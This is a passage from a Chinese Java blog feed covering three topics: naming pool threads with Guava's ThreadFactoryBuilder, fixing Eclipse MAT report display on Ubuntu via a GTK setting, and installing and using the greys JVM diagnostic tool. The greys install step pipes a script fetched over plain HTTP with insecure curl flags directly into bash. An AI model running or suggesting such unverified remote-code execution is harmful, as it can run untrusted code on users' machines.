</span>&#123;</span><br><span class="line">    <span class="keyword">final</span> String nameFormat = builder.nameFormat;</span><br><span class="line">    <span class="keyword">final</span> Boolean daemon = builder.daemon;</span><br><span class="line">    <span class="keyword">final</span> Integer priority = builder.priority;</span><br><span class="line">    <span class="keyword">final</span> UncaughtExceptionHandler uncaughtExceptionHandler =</span><br><span class="line">        builder.uncaughtExceptionHandler;</span><br><span class="line">    <span class="keyword">final</span> ThreadFactory backingThreadFactory =</span><br><span class="line">        (builder.backingThreadFactory != <span class="keyword">null</span>)</span><br><span class="line">        ? builder.backingThreadFactory</span><br><span class="line">        : Executors.defaultThreadFactory();</span><br><span class="line">    <span class="keyword">final</span> AtomicLong count = (nameFormat != <span class="keyword">null</span>) ? <span class="keyword">new</span> AtomicLong(<span class="number">0</span>) : <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> ThreadFactory() &#123;</span><br><span class="line">      <span class="meta">@Override</span> <span class="function"><span class="keyword">public</span> Thread <span class="title">newThread</span><span class="params">(Runnable runnable)</span> </span>&#123;</span><br><span class="line">        Thread thread = backingThreadFactory.newThread(runnable);</span><br><span class="line">        <span class="keyword">if</span> (nameFormat != <span class="keyword">null</span>) &#123;</span><br><span class="line">          thread.setName(format(nameFormat, count.getAndIncrement()));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (daemon != <span class="keyword">null</span>) &#123;</span><br><span class="line">          thread.setDaemon(daemon);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (priority != <span class="keyword">null</span>) &#123;</span><br><span class="line">          thread.setPriority(priority);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (uncaughtExceptionHandler != <span class="keyword">null</span>) &#123;</span><br><span class="line">          thread.setUncaughtExceptionHandler(uncaughtExceptionHandler);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> thread;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p>使用起来挺顺手的：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> ThreadPoolExecutor executor = <span class="keyword">new</span> ThreadPoolExecutor(</span><br><span class="line">          <span class="number">10</span>,</span><br><span class="line">          <span class="number">15</span>,</span><br><span class="line">          <span class="number">10</span>,</span><br><span class="line">          TimeUnit.SECONDS,</span><br><span class="line">          blockingQueue,</span><br><span class="line">          <span class="keyword">new</span> ThreadFactoryBuilder().setNameFormat(<span class="string">"guava-%d"</span>).build(),</span><br><span class="line">          <span class="keyword">new</span> ThreadPoolExecutor.DiscardPolicy()</span><br><span class="line">  );</span><br></pre></td></tr></table></figure>
<p>主要就是给线程整一个名字，用<code>jstack</code>等工具排查问题时方便知道是哪个线程池里的。</p>
<p><code>jstack</code>的结果：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&quot;guava-9&quot; #19 prio=5 os_prio=0 tid=0x00007f5024468000 nid=0x5e3b waiting on condition [0x00007f50104f7000]</span><br><span class="line">   java.lang.Thread.State: WAITING (parking)</span><br><span class="line">        at sun.misc.Unsafe.park(Native Method)</span><br><span class="line">        - parking to wait for  &lt;0x00000000d709af38&gt; (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject)</span><br><span class="line">        at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175)</span><br><span class="line">        at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039)</span><br><span class="line">        at java.util.concurrent.ArrayBlockingQueue.take(ArrayBlockingQueue.java:403)</span><br><span class="line">        at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067)</span><br><span class="line">        at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127)</span><br><span class="line">        at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617)</span><br><span class="line">        at java.lang.Thread.run(Thread.java:745)</span><br></pre></td></tr></table></figure>
<h2 id="更多"><a href="#更多" class="headerlink" title="更多"></a>更多</h2><ol>
<li><a href="http://www.importnew.com/20263.html" rel="external nofollow noopener noreferrer" target="_blank">ExecutorService-10个要诀和技巧 - ImportNew</a></li>
</ol>
]]></content>
      
        <categories>
            
            <category> guava </category>
            
        </categories>
        
        
        <tags>
            
            <tag> concurrent </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[MAT-Ubuntu无法打开Report]]></title>
      <url>http://qsli.github.io/2017/11/12/MAT-Ubuntu/</url>
      <content type="html"><![CDATA[<h2 id="现象"><a href="#现象" class="headerlink" title="现象"></a>现象</h2><p>可以运行<code>Leak Suspects</code>，可以看到报告文件确实生成了，但是无法打开，看error log如下:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">Unhandled event loop exception</span><br><span class="line"></span><br><span class="line">org.eclipse.swt.SWTException: Failed to execute runnable (org.eclipse.swt.SWTError: No more handles [Browser style SWT.MOZILLA and Java system property org.eclipse.swt.browser.DefaultType=mozilla are not supported with GTK 3 as XULRunner is not ported for GTK 3 yet])</span><br><span class="line">	at org.eclipse.swt.SWT.error(SWT.java:4491)</span><br><span class="line">	at org.eclipse.swt.SWT.error(SWT.java:4406)</span><br><span class="line">	at org.eclipse.swt.widgets.Synchronizer.runAsyncMessages(Synchronizer.java:138)</span><br><span class="line">	at org.eclipse.swt.widgets.Display.runAsyncMessages(Display.java:3794)</span><br><span class="line">	at org.eclipse.swt.widgets.Display.readAndDispatch(Display.java:3433)</span><br><span class="line">	at org.eclipse.e4.ui.internal.workbench.swt.PartRenderingEngine$4.run(PartRenderingEngine.java:1127)</span><br><span class="line">	at org.eclipse.core.databinding.observable.Realm.runWithDefault(Realm.java:337)</span><br><span class="line">	at org.eclipse.e4.ui.internal.workbench.swt.PartRenderingEngine.run(PartRenderingEngine.java:1018)</span><br><span class="line">	at org.eclipse.e4.ui.internal.workbench.E4Workbench.createAndRunUI(E4Workbench.java:156)</span><br><span class="line">	at org.eclipse.ui.internal.Workbench$5.run(Workbench.java:694)</span><br><span class="line">	at org.eclipse.core.databinding.observable.Realm.runWithDefault(Realm.java:337)</span><br><span class="line">	at org.eclipse.ui.internal.Workbench.createAndRunWorkbench(Workbench.java:606)</span><br><span class="line">	at org.eclipse.ui.PlatformUI.createAndRunWorkbench(PlatformUI.java:150)</span><br><span class="line">	at org.eclipse.mat.ui.rcp.Application.start(Application.java:26)</span><br><span class="line">	at org.eclipse.equinox.internal.app.EclipseAppHandle.run(EclipseAppHandle.java:196)</span><br><span class="line">	at org.eclipse.core.runtime.internal.adaptor.EclipseAppLauncher.runApplication(EclipseAppLauncher.java:134)</span><br><span class="line">	at org.eclipse.core.runtime.internal.adaptor.EclipseAppLauncher.start(EclipseAppLauncher.java:104)</span><br><span class="line">	at org.eclipse.core.runtime.adaptor.EclipseStarter.run(EclipseStarter.java:380)</span><br><span class="line">	at org.eclipse.core.runtime.adaptor.EclipseStarter.run(EclipseStarter.java:235)</span><br><span class="line">	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)</span><br><span class="line">	at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)</span><br><span class="line">	at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)</span><br><span class="line">	at java.lang.reflect.Method.invoke(Method.java:498)</span><br><span class="line">	at org.eclipse.equinox.launcher.Main.invokeFramework(Main.java:669)</span><br><span class="line">	at org.eclipse.equinox.launcher.Main.basicRun(Main.java:608)</span><br><span class="line">	at org.eclipse.equinox.launcher.Main.run(Main.java:1515)</span><br><span class="line">	at org.eclipse.equinox.launcher.Main.main(Main.java:1488)</span><br><span class="line">Caused by: org.eclipse.swt.SWTError: No more handles [Browser style SWT.MOZILLA and Java system property org.eclipse.swt.browser.DefaultType=mozilla are not supported with GTK 3 as XULRunner is not ported for GTK 3 yet]</span><br><span class="line">	at org.eclipse.swt.SWT.error(SWT.java:4517)</span><br><span class="line">	at org.eclipse.swt.browser.MozillaDelegate.&lt;init&gt;(MozillaDelegate.java:57)</span><br><span class="line">	at org.eclipse.swt.browser.Mozilla.create(Mozilla.java:663)</span><br><span class="line">	at org.eclipse.swt.browser.Browser.&lt;init&gt;(Browser.java:99)</span><br><span class="line">	at org.eclipse.mat.ui.internal.panes.QueryTextResultPane.createPartControl(QueryTextResultPane.java:72)</span><br><span class="line">	at org.eclipse.mat.ui.editor.MultiPaneEditor.addPage(MultiPaneEditor.java:585)</span><br><span class="line">	at org.eclipse.mat.ui.editor.MultiPaneEditor.addPage(MultiPaneEditor.java:574)</span><br><span class="line">	at org.eclipse.mat.ui.editor.MultiPaneEditor.addNewPage(MultiPaneEditor.java:496)</span><br><span class="line">	at org.eclipse.mat.ui.QueryExecution.doDisplayResult(QueryExecution.java:300)</span><br><span class="line">	at org.eclipse.mat.ui.QueryExecution.access$0(QueryExecution.java:240)</span><br><span class="line">	at org.eclipse.mat.ui.QueryExecution$1.run(QueryExecution.java:144)</span><br><span class="line">	at org.eclipse.swt.widgets.RunnableLock.run(RunnableLock.java:35)</span><br><span class="line">	at org.eclipse.swt.widgets.Synchronizer.runAsyncMessages(Synchronizer.java:135)</span><br><span class="line">	... 24 more</span><br></pre></td></tr></table></figure>
<h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><p>这个是<code>gtk</code>的问题。</p>
<p>添加<code>--launcher.GTK_version</code>和<code>2</code>到<code>MemoryAnalyzer.ini</code>文件中</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">-startup</span><br><span class="line">plugins/org.eclipse.equinox.launcher_1.3.100.v20150511-1540.jar</span><br><span class="line">--launcher.library</span><br><span class="line">plugins/org.eclipse.equinox.launcher.gtk.linux.x86_64_1.1.300.v20150602-1417</span><br><span class="line">--launcher.GTK_version</span><br><span class="line">2</span><br><span class="line">-vmargs</span><br><span class="line">-Xmx1024m</span><br></pre></td></tr></table></figure>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ol>
<li><a href="https://askubuntu.com/questions/761604/eclipse-not-working-in-16-04" rel="external nofollow noopener noreferrer" target="_blank">Eclipse not working in 16.04 - Ask Ubuntu</a></li>
</ol>
]]></content>
      
        <categories>
            
            <category> java </category>
            
        </categories>
        
        
        <tags>
            
            <tag> mat </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[使用greys来排查线上问题]]></title>
      <url>http://qsli.github.io/2017/11/12/greys/</url>
      <content type="html"><![CDATA[<h2 id="greys"><a href="#greys" class="headerlink" title="greys"></a>greys</h2><p>greys的理念是将btrace常用的功能命令化，这样可以大大的节省排查问题的时间。</p>
<h3 id="greys-安装"><a href="#greys-安装" class="headerlink" title="greys 安装"></a>greys 安装</h3><p>推荐使用网络安装:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -sLk http://ompc.oss.aliyuncs.com/greys/install.sh|bash</span><br></pre></td></tr></table></figure>
<p>安装后家目录下有如下的文件：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">/home/qishengli/.greys</span><br><span class="line">└── lib</span><br><span class="line">    └── 1.7.6.4</span><br><span class="line">        ├── greys</span><br><span class="line">        │   ├── ga.sh</span><br><span class="line">        │   ├── greys-agent.jar</span><br><span class="line">        │   ├── greys-core.jar</span><br><span class="line">        │   ├── greys.sh</span><br><span class="line">        │   ├── gs.sh</span><br><span class="line">        │   └── install-local.sh</span><br><span class="line">        └── greys-1.7.6.4-bin.zip</span><br></pre></td></tr></table></figure>
<blockquote>
<p>其中greys-core.jar为greys的程序主体，启动类、加载类都在这个jar包当中；<br>greys-agent.jar则为目标JVM的加载引导程序；<br>greys.sh为一个可执行脚本，为Greys的启动脚本。</p>
</blockquote>
<h3 id="greys常用功能"><a href="#greys常用功能" class="headerlink" title="greys常用功能"></a>greys常用功能</h3><p>启动脚本，</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -u tomcat -H ./greys.sh  3292</span><br></pre></td></tr></table></figure>
<p>为了安全考虑，一般会限制tomcat启动用户的权限，这里<code>-u</code>指定了<code>tomcat</code>启动的用户， <code>3292</code>是tomcat的进程id。<br>交互式shell，输入help即可看到所有支持的命令。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">ga?&gt;help</span><br><span class="line">+----------+----------------------------------------------------------------------------------+</span><br><span class="line">|       sc | Search all the classes loaded by JVM                                             |</span><br><span class="line">+----------+----------------------------------------------------------------------------------+</span><br><span class="line">|       sm | Search the method of classes loaded by JVM                                       |</span><br><span class="line">+----------+----------------------------------------------------------------------------------+</span><br><span class="line">|  monitor | Monitor the execution of specified Class and its method                          |</span><br><span class="line">+----------+----------------------------------------------------------------------------------+</span><br><span class="line">|    watch | Display the details of specified class and method                                |</span><br><span class="line">+----------+----------------------------------------------------------------------------------+</span><br><span class="line">|       tt | Time Tunnel                                                                      |</span><br><span class="line">+----------+----------------------------------------------------------------------------------+</span><br><span class="line">|    trace | Display the detailed thread stack of specified class and method                  |</span><br><span class="line">+----------+----------------------------------------------------------------------------------+</span><br><span class="line">|       js | Enhanced JavaScript                                                              |</span><br><span class="line">+----------+----------------------------------------------------------------------------------+</span><br><span class="line">|   ptrace | Display the detailed thread path stack of specified class and method             |</span><br><span class="line">+----------+----------------------------------------------------------------------------------+</span><br><span class="line">|    stack | Display the stack trace of specified class and method                            |</span><br><span class="line">+----------+----------------------------------------------------------------------------------+</span><br><span class="line">|     quit | Quit Greys console                                                               |</span><br><span class="line">+----------+----------------------------------------------------------------------------------+</span><br><span class="line">|  session | Display current session information                                              |</span><br><span class="line">+----------+----------------------------------------------------------------------------------+</span><br><span class="line">|  version | Display Greys version                                                            |</span><br><span class="line">+----------+----------------------------------------------------------------------------------+</span><br><span class="line">|      jvm | Display the target JVM information                                               |</span><br><span class="line">+----------+----------------------------------------------------------------------------------+</span><br><span class="line">|    reset | Reset all the enhanced classes                                                   |</span><br><span class="line">+----------+----------------------------------------------------------------------------------+</span><br><span class="line">|      asm | Display class bytecode by asm format                                             |</span><br><span class="line">+----------+----------------------------------------------------------------------------------+</span><br><span class="line">| shutdown | Shut down Greys server and exit the console                                      |</span><br><span class="line">+----------+----------------------------------------------------------------------------------+</span><br><span class="line">|     help | Display Greys Help                                                               |</span><br><span class="line">+----------+----------------------------------------------------------------------------------+</span><br><span class="line">|      top | Display The Threads Of Top CPU TIME                                              |</span><br><span class="line">+----------+----------------------------------------------------------------------------------+</span><br></pre></td></tr></table></figure>
<p>help后面可以跟具体的命令， 会显示命令的具体用法。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line">ga?&gt;help tt</span><br><span class="line">+---------+----------------------------------------------------------------------------------+</span><br><span class="line">|   USAGE | -[tlDi:x:w:s:pdEn:] class-pattern method-pattern condition-express               |</span><br><span class="line">|         | Time Tunnel                                                                      |</span><br><span class="line">+---------+----------------------------------------------------------------------------------+</span><br><span class="line">| OPTIONS |              [t] | Record the method invocation within time fragments            |</span><br><span class="line">|         | -----------------+-------------------------------------------------------------- |</span><br><span class="line">|         |              [l] | List all the time fragments                                   |</span><br><span class="line">|         | -----------------+-------------------------------------------------------------- |</span><br><span class="line">|         |              [D] | Delete all the time fragments                                 |</span><br><span class="line">|         | -----------------+-------------------------------------------------------------- |</span><br><span class="line">|         |             [i:] | Display the detailed information from specified time fragmen  |</span><br><span class="line">|         |                  | t                                                             |</span><br><span class="line">|         | -----------------+-------------------------------------------------------------- |</span><br><span class="line">|         |             [x:] | Expand level of object (0 by default)                         |</span><br><span class="line">|         | -----------------+-------------------------------------------------------------- |</span><br><span class="line">|         |             [w:] | watch-express, watch the time fragment by OGNL express, like  |</span><br><span class="line">|         |                  |  params[0], returnObj, throwExp and so on.                    |</span><br><span class="line">|         |                  |                                                               |</span><br><span class="line">|         |                  | FOR EXAMPLE                                                   |</span><br><span class="line">|         |                  |     params[0]                                                 |</span><br><span class="line">|         |                  |     params[0]+params[1]                                       |</span><br><span class="line">|         |                  |     returnObj                                                 |</span><br><span class="line">|         |                  |     throwExp                                                  |</span><br><span class="line">|         |                  |     target                                                    |</span><br><span class="line">|         |                  |     clazz                                                     |</span><br><span class="line">|         |                  |     method                                                    |</span><br><span class="line">|         |                  |                                                               |</span><br><span class="line">|         |                  | THE STRUCTURE                                                 |</span><br><span class="line">|         |                  |           target : the object                                 |</span><br><span class="line">|         |                  |            clazz : the object&apos;s class                         |</span><br><span class="line">|         |                  |           method : the constructor or method                  |</span><br><span class="line">|         |                  |     params[0..n] : the parameters of method                   |</span><br><span class="line">|         |                  |        returnObj : the returned object of method              |</span><br><span class="line">|         |                  |         throwExp : the throw exception of method              |</span><br><span class="line">|         |                  |         isReturn : the method ended by return                 |</span><br><span class="line">|         |                  |          isThrow : the method ended by throwing exception     |</span><br><span class="line">|         | -----------------+-------------------------------------------------------------- |</span><br><span class="line">|         |             [s:] | Search-expression, to search the time fragments by OGNL expr  |</span><br><span class="line">|         |                  | ess                                                           |</span><br><span class="line">|         |                  |                                                               |</span><br><span class="line">|         |                  | FOR EXAMPLE                                                   |</span><br><span class="line">|         |                  |      TRUE : 1==1                                              |</span><br><span class="line">|         |                  |      TRUE : true                                              |</span><br><span class="line">|         |                  |     FALSE : false                                             |</span><br><span class="line">|         |                  |      TRUE : params.length&gt;=0                                  |</span><br><span class="line">|         |                  |     FALSE : 1==2                                              |</span><br><span class="line">|         |                  |                                                               |</span><br><span class="line">|         |                  | THE STRUCTURE                                                 |</span><br><span class="line">|         |                  |           target : the object                                 |</span><br><span class="line">|         |                  |            clazz : the object&apos;s class                         |</span><br><span class="line">|         |                  |           method : the constructor or method                  |</span><br><span class="line">|         |                  |     params[0..n] : the parameters of method                   |</span><br><span class="line">|         |                  |        returnObj : the returned object of method              |</span><br><span class="line">|         |                  |         throwExp : the throw exception of method              |</span><br><span class="line">|         |                  |         isReturn : the method ended by return                 |</span><br><span class="line">|         |                  |          isThrow : the method ended by throwing exception     |</span><br><span class="line">|         |                  |           #index : the index of time-fragment record          |</span><br><span class="line">|         |                  |       #processId : the process ID of time-fragment record     |</span><br><span class="line">|         |                  |            #cost : the cost time of time-fragment record      |</span><br><span class="line">|         | -----------------+-------------------------------------------------------------- |</span><br><span class="line">|         |              [p] | Replay the time fragment specified by index                   |</span><br><span class="line">|         | -----------------+-------------------------------------------------------------- |</span><br><span class="line">|         |              [d] | Delete time fragment specified by index                       |</span><br><span class="line">|         | -----------------+-------------------------------------------------------------- |</span><br><span class="line">|         |              [E] | Enable regular expression to match (wildcard matching by def  |</span><br><span class="line">|         |                  | ault)                                                         |</span><br><span class="line">|         | -----------------+-------------------------------------------------------------- |</span><br><span class="line">|         |             [n:] | Threshold of execution times                                  |</span><br><span class="line">|         | -----------------+-------------------------------------------------------------- |</span><br><span class="line">|         |    class-pattern | Path and classname of Pattern Matching                        |</span><br><span class="line">|         | -----------------+-------------------------------------------------------------- |</span><br><span class="line">|         |   method-pattern | Method of Pattern Matching                                    |</span><br><span class="line">|         | -----------------+-------------------------------------------------------------- |</span><br><span class="line">|         |  condition-expre | Conditional expression by OGNL                                |</span><br><span class="line">|         |               ss |                                                               |</span><br><span class="line">|         |                  | FOR EXAMPLE                                                   |</span><br><span class="line">|         |                  |      TRUE : 1==1                                              |</span><br><span class="line">|         |                  |      TRUE : true                                              |</span><br><span class="line">|         |                  |     FALSE : false                                             |</span><br><span class="line">|         |                  |      TRUE : params.length&gt;=0                                  |</span><br><span class="line">|         |                  |     FALSE : 1==2                                              |</span><br><span class="line">|         |                  |                                                               |</span><br><span class="line">|         |                  | THE STRUCTURE                                                 |</span><br><span class="line">|         |                  |           target : the object                                 |</span><br><span class="line">|         |                  |            clazz : the object&apos;s class                         |</span><br><span class="line">|         |                  |           method : the constructor or method                  |</span><br><span class="line">|         |                  |     params[0..n] : the parameters of method                   |</span><br><span class="line">|         |                  |        returnObj : the returned object of method              |</span><br><span class="line">|         |                  |         throwExp : the throw exception of method              |</span><br><span class="line">|         |                  |         isReturn : the method ended by return                 |</span><br><span class="line">|         |                  |          isThrow : the method ended by throwing exception     |</span><br><span class="line">|         |                  |            #cost : the cost(ms) of method                     |</span><br><span class="line">+---------+----------------------------------------------------------------------------------+</span><br><span class="line">| EXAMPLE | tt -t *StringUtils isTop                                                         |</span><br><span class="line">|         | tt -t *StringUtils isTop params[0].length==1                                     |</span><br><span class="line">|         | tt -l                                                                            |</span><br><span class="line">|         | tt -D                                                                            |</span><br><span class="line">|         | tt -i 1000 -w params[0]                                                          |</span><br><span class="line">|         | tt -i 1000 -d                                                                    |</span><br><span class="line">|         | tt -i 1000                                                                       |</span><br><span class="line">+---------+----------------------------------------------------------------------------------+</span><br></pre></td></tr></table></figure>
<h4 id="top"><a href="#top" class="headerlink" title="top"></a>top</h4><p>greys的shell里集成的top功能，可以显示jstack中每个线程的cpu占比。</p>
<p>没有greys的时候的做法可能是，先查看native的线程的cpu占用</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">top -p 3292 -H</span><br></pre></td></tr></table></figure>
<p><code>-H</code>是显示到线程级别</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Tasks: 699 total,   0 running, 699 sleeping,   0 stopped,   0 zombie</span><br><span class="line">Cpu(s):  8.0%us,  1.6%sy,  0.0%ni, 90.2%id,  0.0%wa,  0.0%hi,  0.2%si,  0.1%st</span><br><span class="line">Mem:   8059648k total,  7801008k used,   258640k free,    33328k buffers</span><br><span class="line">Swap:  4194296k total,        0k used,  4194296k free,  2453588k cached</span><br><span class="line"></span><br><span class="line">  PID USER      PR  NI  VIRT  RES  SHR S %CPU %MEM    TIME+  COMMAND                                                                            </span><br><span class="line"> 5620 tomcat    20   0 9446m 4.2g 6696 S  6.6 54.2  33:46.86 java                                                                               </span><br><span class="line"> 5764 tomcat    20   0 9446m 4.2g 6696 S  5.0 54.2   1:05.94 java                                                                               </span><br><span class="line"> 5787 tomcat    20   0 9446m 4.2g 6696 S  4.0 54.2  57:48.76 java                                                                               </span><br><span class="line"> 5790 tomcat    20   0 9446m 4.2g 6696 S  2.3 54.2  40:31.71 java                                                                               </span><br><span class="line"> 3523 tomcat    20   0 9446m 4.2g 6696 S  1.3 54.2  68:48.18 java                                                                               </span><br><span class="line"> 3982 tomcat    20   0 9446m 4.2g 6696 S  1.3 54.2  21:15.22 java                                                                               </span><br><span class="line"> 3385 tomcat    20   0 9446m 4.2g 6696 S  1.0 54.2  54:10.76 java                                                                               </span><br><span class="line"> 3413 tomcat    20   0 9446m 4.2g 6696 S  1.0 54.2  29:12.64 java</span><br></pre></td></tr></table></figure>
<p>由于jstack的输出是16进制的线程号，我们需要根据<code>PID</code>进行转换</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">printf &quot;%x\n&quot; 5620</span><br><span class="line">15f4</span><br></pre></td></tr></table></figure>
<p>然后<code>jstack</code>去查找相应的java线程栈</p>
